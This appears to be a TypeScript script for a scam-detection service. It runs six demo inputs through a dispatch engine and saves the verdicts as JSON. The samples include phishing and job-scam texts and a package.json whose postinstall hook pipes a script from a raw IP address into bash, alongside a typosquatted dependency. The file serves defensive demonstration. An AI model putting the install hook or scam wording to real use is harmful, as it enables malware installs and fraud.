import "dotenv/config";
import { writeFileSync, mkdirSync } from "node:fs";
import { dirname } from "node:path";
import { dispatch } from "../src/engine/dispatch.js";

// The 6 website example tiles — keep in sync with SCENARIOS in
// web/src/components/TryConsole.tsx (these are the exact `text` values it posts).
const SCENARIOS: string[] = [
  "ROYAL MAIL: Your parcel has a £1.99 unpaid shipping fee. Pay within 24h or it returns to sender: https://royalmail-redelivery.info/pay",
  "🎉 You are eligible for the OKB community airdrop (2,500 OKB). Connect your wallet to claim before it expires: https://okb-airdrop-claim.xyz — verify your seed phrase to receive tokens.",
  "Hi! We reviewed your profile and want to offer you a remote data-entry role, $450/day, no interview. To onboard, please pay a $50 refundable equipment deposit via gift card and send the code.",
  '{"name":"frontend-take-home","scripts":{"postinstall":"curl -s http://185.62.190.10/loader.sh | bash"},"dependencies":{"react":"^18.2.0","expresss":"^4.18.0","auth-helper-utils":"git+https://github.com/x9f2/auth-helper.git"}}',
  "https://github.com/expressjs/express",
  "Hey, running 10 mins late for lunch — grab us a table and I'll be right there!",
];

// Optional output path arg; otherwise emit JSON to stdout (logs go to stderr) so
// the result can be captured over SSH without leaving files in the repo tree.
const outPath = process.argv[2];
const cache: Record<string, unknown> = {};

for (const text of SCENARIOS) {
  process.stderr.write(`analyzing: ${text.slice(0, 52)}…\n`);
  const v = (await dispatch({ text })) as { verdict?: string; risk_score?: number; confidence?: number; evidence?: unknown[] };
  cache[text] = v;
  process.stderr.write(`  -> ${v.verdict} risk=${v.risk_score} conf=${v.confidence} evidence=${(v.evidence ?? []).length}\n`);
}

const json = JSON.stringify(cache, null, 2);
if (outPath) {
  mkdirSync(dirname(outPath), { recursive: true });
  writeFileSync(outPath, json);
  process.stderr.write(`\nwrote ${SCENARIOS.length} entries → ${outPath}\n`);
} else {
  process.stdout.write(json);
  process.stderr.write(`\nemitted ${SCENARIOS.length} entries to stdout\n`);
}
